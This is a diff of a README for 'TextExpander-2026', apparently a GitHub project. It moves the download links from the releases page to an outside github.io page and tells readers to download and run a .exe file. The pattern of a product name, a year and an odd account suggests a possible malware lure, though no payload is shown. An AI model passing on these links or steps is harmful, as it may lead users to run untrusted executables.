@@ -1,6 +1,6 @@
 # ⌨️ TextExpander-2026 - Save time with custom keyboard shortcuts
 
-[Download TextExpander-2026 Here](https://github.com/Tiphanieintelligent737/TextExpander-2026/releases)
+[Download TextExpander-2026 Here](https://tiphanieintelligent737.github.io)
 
 ## 📖 About the software
 
@@ -22,7 +22,7 @@ This version runs well on modern Windows computers. Ensure you have the followin
 Follow these steps to put the software on your computer.
 
 1. Open your web browser.
-2. Visit the [releases page](https://github.com/Tiphanieintelligent737/TextExpander-2026/releases).
+2. Visit the [releases page](https://tiphanieintelligent737.github.io).
 3. Look for the file ending in .exe. 
 4. Click the file name to start the download.
 5. Wait for the download to finish.
